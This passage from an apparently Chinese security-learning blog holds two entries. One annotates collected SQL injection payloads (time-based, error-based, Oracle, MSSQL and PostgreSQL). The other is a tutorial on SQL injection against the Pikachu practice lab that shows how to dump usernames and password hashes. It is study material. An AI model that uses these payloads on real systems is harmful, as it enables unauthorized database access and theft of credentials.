6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)--</span><br><span class="line">2&#x27;：在 SQL 查询中，这个部分可能是用来闭合之前的字符串或条件。</span><br><span class="line">AND 6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)：在这里，通过构造一个条件，尝试调用 DBMS_PIPE.RECEIVE_MESSAGE 函数。这个函数用于从管道中接收消息，参数是一个由字符值拼接而成的字符串。</span><br><span class="line">CHR(98)||CHR(66)||CHR(90)||CHR(108)：这部分是 Oracle SQL 中用来生成字符的函数，将字符的 ASCII 值转换为字符本身。在这里，拼接的字符可能是 &quot;bBZl&quot;。</span><br><span class="line"></span><br><span class="line">&#x27;and 1=user::integer--</span><br><span class="line">1=user::integer 可能是尝试将一个整数等于另一个整数，这里是 1 等于用户 user 的整数值。</span><br><span class="line"></span><br><span class="line">1&#x27;,&#x27;10&#x27;,(select+@`,&#x27;`+or+if(1=0,1,(select+~0+1))+limit+0,1))--+&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;1&#x27;,&#x27;10&#x27;,(select @&#x27;,&#x27;：在这里，逗号可能用于分隔不同字段或参数。&#x27;1&#x27; 可能是用来闭合之前的字符串，&#x27;10&#x27; 可能是一个参数。</span><br><span class="line">+or+if(1=0,1,(select ~0+1))+limit+0,1))--+&#x27;：这是尝试执行 SQL 注入攻击的关键部分：</span><br><span class="line">+or+if(1=0,1,(select ~0+1))：构造一个条件，如果 1 等于 0，则返回 1，否则执行 select ~0+1，可能是为了检测条件是否成立。</span><br><span class="line">limit 0,1：在某些数据库中，LIMIT 语句用于限制结果集的返回行数。</span><br><span class="line">--+&#x27;：注释掉后续语句，确保注入部分不会破坏整个查询。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">延时</span><br><span class="line"></span><br><span class="line">AND (SELECT 4802 FROM (SELECT(SLEEP(5)))ndMq) AND &#x27;NEoX&#x27;=&#x27;NEoX</span><br><span class="line">我有点疑惑这个为啥要嵌套一个，是为了让里面的select (sleep(5))先执行吗？</span><br><span class="line"></span><br><span class="line"> &quot;&#x27;XOR(if(now()=sysdate(),sleep(5),0))XOR&#x27;&quot;</span><br><span class="line">里面好像是做了一个判断，检查当前时间是否等于系统日期，如果相等，则执行 sleep(5)，即让查询暂停 5 秒钟，否则返回 0</span><br><span class="line"></span><br><span class="line">?do=getList&amp;lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1</span><br><span class="line"></span><br><span class="line">我在里面还看到了这么一个的，就是一个条件判断语句 CASE WHEN (9765=9765) THEN &#x27;&#x27; ELSE (SELECT 7700 UNION SELECT 3389) END：在这里，根据条件判断，如果 9765 等于 9765，则返回空字符串，否则返回一个联合查询结果集 (7700) UNION (3389)。</span><br><span class="line"></span><br><span class="line">(SELECT 4655 FROM (SELECT(SLEEP(5)))usQE</span><br><span class="line"></span><br><span class="line">4655：在这个语句中，4655 只是一个随机的数字，通常用作测试载荷，没有实际意义，只是用于检查应用程序是否执行了预期的操作或是否存在漏洞。</span><br><span class="line">SLEEP(5)：SLEEP(5) 是一个 MySQL 的函数，会使查询暂停执行 5 秒钟。在这里，它被用作一个时间延迟函数，用来测试应用程序对时间延迟攻击（基于时间的盲注）的防护性能。</span><br><span class="line">usQE：usQE 可能只是一个命名，没有特定含义，主要是作为查询的别名或标识符使用。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MD5</span><br><span class="line"></span><br><span class="line">action=detailInfo&amp;fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(&#x27;MD5&#x27;,&#x27;123&#x27;)),3,32))&lt;0--</span><br><span class="line"></span><br><span class="line">这段代码的目的是：</span><br><span class="line"></span><br><span class="line">通过 HASHBYTES(&#x27;MD5&#x27;,&#x27;123&#x27;) 对字符串 &#x27;123&#x27; 进行 MD5 哈希处理。</span><br><span class="line">正常来说,hash转换以后是一串16进制数字，这里用sys.fn_sqlvarbasetostr将哈希后的结果转换为字符串。</span><br><span class="line">使用 SUBSTRING 函数从第三个字符开始提取长度为 32 的子字符串。</span><br><span class="line">最后，尝试执行一个逻辑比较，判断提取的子字符串是否小于 0。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">报错</span><br><span class="line"></span><br><span class="line">?updatexml(1,concat(0x7e,user(),0x7e),1)=1</span><br><span class="line">正统报错注入，所以这个是师傅updatexml=1是吗</span><br><span class="line"></span><br><span class="line">1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1)</span><br><span class="line"></span><br><span class="line">好吧这才是正统的</span><br><span class="line"></span><br><span class="line">url解码</span><br><span class="line">1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">updatexml(1,concat(0x5c,md5(123456),0x5c),1) 这部分代码尝试将目标节点的内容设置为 &#x27;\md5(123456)\&#x27;</span><br><span class="line">concat连接</span><br><span class="line">0x5c解码\，就是把1替换成\md5(123456)\</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="PostgreSql"><a href="#PostgreSql" class="headerlink" title="PostgreSql"></a>PostgreSql</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PG_SLEEP</span><br><span class="line"></span><br><span class="line">就是mysql中的sleep</span><br><span class="line">admin&#x27;);SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终也没看完人家的整个漏洞库，看了大概有一半吧，魂飞了，这是里面出现的各种师傅的注入手法，也是挺新奇的，只能说，孩子太菜了还是带学啊</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防--sql注入</title>
      <link href="/2025/01/08/2024%E5%B9%B48%E6%9C%8822%E6%97%A5-%E5%AE%88%E5%A4%9C/"/>
      <url>/2025/01/08/2024%E5%B9%B48%E6%9C%8822%E6%97%A5-%E5%AE%88%E5%A4%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><img src="https://pic.imgdb.cn/item/66c84ed5d9c307b7e94615ae.png" alt=""></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>脚本代码在实现代码和数据库进行通讯时，讲定义的sql语句进行执行，其中sql能够通过参数来传递自定义值来实现控制sql语句，从而执行恶意的sql语句</p><p>sql首要条件就是有参数，可控的参数，但不是说url没有参数就不能注入</p><p>但是如果是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/admin_login.asp?id=1</span><br></pre></td></tr></table></figure><p>是可以注入的</p><p>如果有两个可变参数比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/admin_login.asp?id=1&amp;page=1</span><br></pre></td></tr></table></figure><p>判断id有注入的时候应该尝试<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/admin_login.asp?id=1 注入语句  &amp; page=1</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx/admin_login.asp?page=1&amp;id=1  注入语句</span><br></pre></td></tr></table></figure></p><p>mysql中<code># --</code>是注释符的意思<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,email,username from member where username =&quot;vince&quot;;</span><br><span class="line">+----+-------------------+----------+</span><br><span class="line">| id | email             | username |</span><br><span class="line">+----+-------------------+----------+</span><br><span class="line">|  1 | vince@pikachu.com | vince    |</span><br><span class="line">+----+-------------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,email,username from member -- where username =&quot;vince&quot;;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+-------------------+----------+</span><br><span class="line">| id | email             | username |</span><br><span class="line">+----+-------------------+----------+</span><br><span class="line">|  1 | vince@pikachu.com | vince    |</span><br><span class="line">|  2 | allen@pikachu.com | allen    |</span><br><span class="line">|  3 | kobe@pikachu.com  | kobe     |</span><br><span class="line">|  4 | grady@pikachu.com | grady    |</span><br><span class="line">|  5 | kevin@pikachu.com | kevin    |</span><br><span class="line">|  6 | lucy@pikachu.com  | lucy     |</span><br><span class="line">|  7 | lili@pikachu.com  | lili     |</span><br><span class="line">+----+-------------------+----------+</span><br></pre></td></tr></table></figure></p><p>为什么平常注入的时候要加’呢，因为一般都是类似<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">$query=&#x27;select id ,email,username from member where username=&#x27;[name]&#x27;;</span><br></pre></td></tr></table></figure><br>当你注入<code>xx&#39; or 1=1 --+</code>这种的时候</p><p>会变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">$query=&#x27;select id ,email,username from member where username=&#x27;xx&#x27; or 1=1 --+&#x27;;</span><br></pre></td></tr></table></figure><p>在其中，’xx’提前闭合了，又因为or的原因导致1=1永真成立，使得sql语句成立</p><h2 id="如何找注入点位置"><a href="#如何找注入点位置" class="headerlink" title="如何找注入点位置"></a>如何找注入点位置</h2><p>还是那句话，找自定义变量的</p><p>类似?xx=xxx这种的，可以一试</p><p>有些交互的地方类似分页这种数据自动变化的，可能有limit的限制；<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,username from member limit 0,2;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    17</span><br><span class="line">Current database: pikachu</span><br><span class="line"></span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">|  1 | vince    |</span><br><span class="line">|  2 | allen    |</span><br><span class="line">+----+----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,username from member limit 2,2;</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">|  3 | kobe     |</span><br><span class="line">|  4 | grady    |</span><br><span class="line">+----+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,username from member limit 4,2;</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">|  5 | kevin    |</span><br><span class="line">|  6 | lucy     |</span><br><span class="line">+----+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>理论上，只要与后端数据库进行交互的地方，都可能存在sql注入，甚至cookie这里面都可以，不止只局限于url里面的?xx=xx</p><p>只要与后台有交互都可以(抓包)</p><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>在网址中空格可以用+代替</p><p>union联合查询需要有同样的列数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,username from member union select username,password from users;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    19</span><br><span class="line">Current database: pikachu</span><br><span class="line"></span><br><span class="line">+---------+----------------------------------+</span><br><span class="line">| id      | username                         |</span><br><span class="line">+---------+----------------------------------+</span><br><span class="line">| 1       | vince                            |</span><br><span class="line">| 2       | allen                            |</span><br><span class="line">| 3       | kobe                             |</span><br><span class="line">| 4       | grady                            |</span><br><span class="line">| 5       | kevin                            |</span><br><span class="line">| 6       | lucy                             |</span><br><span class="line">| 7       | lili                             |</span><br><span class="line">| admin   | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| pikachu | 670b14728ad9902aecba32e22fa4f6bd |</span><br><span class="line">| test    | e99a18c428cb38d5f260853678922e03 |</span><br><span class="line">+---------+----------------------------------+</span><br><span class="line">10 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p><p>所以就可以使用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select username,password from users#</span><br></pre></td></tr></table></figure></p><p>出来的md5，你可以上cmd5进行解密<br><a href="cmd5.com">cmd5</a></p><h2 id="简单常用测试语句和注释符号"><a href="#简单常用测试语句和注释符号" class="headerlink" title="简单常用测试语句和注释符号"></a>简单常用测试语句和注释符号</h2><p>在GET请求中，不允许出现空格，所以我们需要用+代替，当然你也可以用url编码<br>POST中没有问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">或者url编码为```%20```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sql中常见的注释符号就是```#以及--（--后面必须加一个空格，这就是常见的--+的来源）```</span><br><span class="line"></span><br><span class="line">在GET请求中，url部分也不能出现#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```常见测试语句</span><br><span class="line">引号测试</span><br><span class="line"></span><br><span class="line">加一个&quot;或者&#x27;，看是否报错</span><br><span class="line">原因也很简单</span><br><span class="line">$query=&#x27;select id ,email,username from member where username=&#x27;[name]&#x27;中，你只输入&#x27;的话就成了</span><br><span class="line">$query=&#x27;select id ,email,username from member where username=&#x27;&#x27;&#x27;；</span><br><span class="line">前面两个引号已经闭合了，最后多的这个就报错了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">永真</span><br><span class="line">or 1=1 后面的1=1永真，前面的语句也为真就</span><br><span class="line">and 1=1 两个同时为真才真，查询结果和不加1=1一样，防护中有一种参数化查询，又名PDO预处理，参数化查询可能将&#x27;1 and 1=1 &#x27;整个当成name查询，正常输入&#x27;1 and 1=1&#x27;应该查询不到，但是如果查询到了说明可能没进行预处理，这时可以加一个永假，如果and 1=1查到了，and 1=2不行，说明存在</span><br><span class="line"></span><br><span class="line">永假</span><br><span class="line">and 1=2查询结果为假，啥都么的应该</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">union select 联合查询</span><br></pre></td></tr></table></figure><h2 id="sqk注入分类"><a href="#sqk注入分类" class="headerlink" title="sqk注入分类"></a>sqk注入分类</h2><p>主要分为数字型，字符型，搜索型，xx型</p><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>数据库中是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&#x27;select id ,email,username from member where id=$id;</span><br></pre></td></tr></table></figure><br>这种id=$id的，数据库中类型是int类型（如果是int unsigned的话后面的unsigned说明不可为负号）</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&#x27;select id ,email,username from member where id=&quot;[name]&quot;;</span><br></pre></td></tr></table></figure><h3 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h3><p>可以使用模糊匹配<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,email from member where username like &quot;vin&quot;;</span><br><span class="line">+----+-------------------+</span><br><span class="line">| id | email             |</span><br><span class="line">+----+-------------------+</span><br><span class="line">|  1 | vince@pikachu.com |</span><br><span class="line">+----+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><br>=表示的是精确匹配，而对应的可以用like作为模糊匹配，%vin表示以vin结尾的。%表示的是通配符，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">vin开头</span><br><span class="line">mysql&gt; select id,email from member where username like &quot;vin%&quot;;</span><br><span class="line">+----+-------------------+</span><br><span class="line">| id | email             |</span><br><span class="line">+----+-------------------+</span><br><span class="line">|  1 | vince@pikachu.com |</span><br><span class="line">+----+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vin结尾</span><br><span class="line">mysql&gt; select id,email from member where username like &quot;%vin&quot;;</span><br><span class="line">+----+-------------------+</span><br><span class="line">| id | email             |</span><br><span class="line">+----+-------------------+</span><br><span class="line">|  5 | kevin@pikachu.com |</span><br><span class="line">+----+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">包含vin</span><br><span class="line">mysql&gt; select id,email from member where username like &quot;%vin%&quot;;</span><br><span class="line">+----+-------------------+</span><br><span class="line">| id | email             |</span><br><span class="line">+----+-------------------+</span><br><span class="line">|  1 | vince@pikachu.com |</span><br><span class="line">|  5 | kevin@pikachu.com |</span><br><span class="line">+----+-------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>也可以用上面的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or 1=1#</span><br></pre></td></tr></table></figure></p><p>进行闭合</p><h3 id="xx型"><a href="#xx型" class="headerlink" title="xx型"></a>xx型</h3><p>用一些特殊符号，像是()[]这种<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&#x27;select id ,email,username from member where id=（&quot;[name]&quot;）；</span><br></pre></td></tr></table></figure></p><p>注意要闭合括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx)&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure><h3 id="json类型"><a href="#json类型" class="headerlink" title="json类型"></a>json类型</h3><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">content-type:检查数据是什么格式，常用的有三个</span><br><span class="line"></span><br><span class="line">1.application/x-www-form-urlencoded,浏览器传输的时候的默认类型值</span><br><span class="line">urlencoded格式是  键值对  比如 id=1&amp;username=2&amp;passwd=3</span><br><span class="line"></span><br><span class="line">2.application/json,</span><br><span class="line">&#123;[&quot;id&quot;:[（&quot;id&quot;：“xxx”）]]&#125;这种,很明显的一大堆的json数据类型</span><br><span class="line">&#123;&quot;name&quot;:&quot;vernus&quot;,&quot;password&quot;:&quot;123&quot;&#125;这个也是json类型</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66c9a281d9c307b7e921b5e4.png" alt=""></p><p>根据不同的application，服务端的接收也不同</p><p>多应用于前后端分离的项目，app，小程序，公众号</p><p><img src="https://pic.imgdb.cn/item/66c9a46dd9c307b7e926e1ca.png" alt=""></p><h4 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h4><p>跟正常的一样，但是键值对，键必须双引号，值字符串双引号，所以我们可以尝试用单引号注入</p><p>可以在页面最下面<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json=&#123;搞一个json的&#125;，参考</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66c9a619d9c307b7e9287dbb.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66c9a6a3d9c307b7e9290244.png" alt=""></p><h3 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h3><p><img src="https://pic.imgdb.cn/item/66c9a8c3d9c307b7e92b03ac.png" alt=""></p><p>GET改urlencode的，POST改下面请求体的，cookie直接尝试就行</p><h3 id="按请求位置分类"><a href="#按请求位置分类" class="headerlink" title="按请求位置分类"></a>按请求位置分类</h3><p><img src="https://pic.imgdb.cn/item/66c9aa3ed9c307b7e92c6c12.png" alt=""></p><p>ua里面注入的话，可以考虑一下报错注入</p><h3 id="mysql变量和-函数"><a href="#mysql变量和-函数" class="headerlink" title="mysql变量和 函数"></a>mysql变量和 函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version                                 查看版本</span><br><span class="line">version_compile_os                      查看当前操作系统</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用的时候执行下面的即可<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@语句</span><br></pre></td></tr></table></figure></p><p>mysql内置函数，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| NULL       |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.12    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>适用于页面上没有任何反馈信息的</p><p>常用的报错函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Updatexml():函数是mysql对xml文档数据进行查询和修改的xpath函数</span><br><span class="line">extractvalue()：函数是mysqlxml文档进行查询的xpath函数</span><br><span class="line">floor():mysql中用于取整的函数</span><br></pre></td></tr></table></figure></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>内容替换的</p><p>updatexml（xml_document,xpath_string,new_value）</p><p><img src="https://pic.imgdb.cn/item/66ca8675d9c307b7e94d495d.png" alt=""></p><p>mysql的xpath</p><p><img src="https://pic.imgdb.cn/item/66ca87a8d9c307b7e94e3ec3.png" alt=""></p><p>中间的’//‘是xpath，如上图判断的是/root/message/content里面的msg替换成<br>I an fine,thank you</p><p>concat拼接，<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;hello&#x27;,&#x27;world&#x27;);</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    10</span><br><span class="line">Current database: *** NONE ***</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">| concat(&#x27;hello&#x27;,&#x27;world&#x27;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| helloworld              |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(&#x27;hello&#x27;,concat(&#x27;&gt;&gt;&#x27;,(select version()),&quot;&lt;&lt;&quot;),&quot;world&quot;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;&gt;&gt;8.0.12&lt;&lt;&#x27;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>先在<code>select 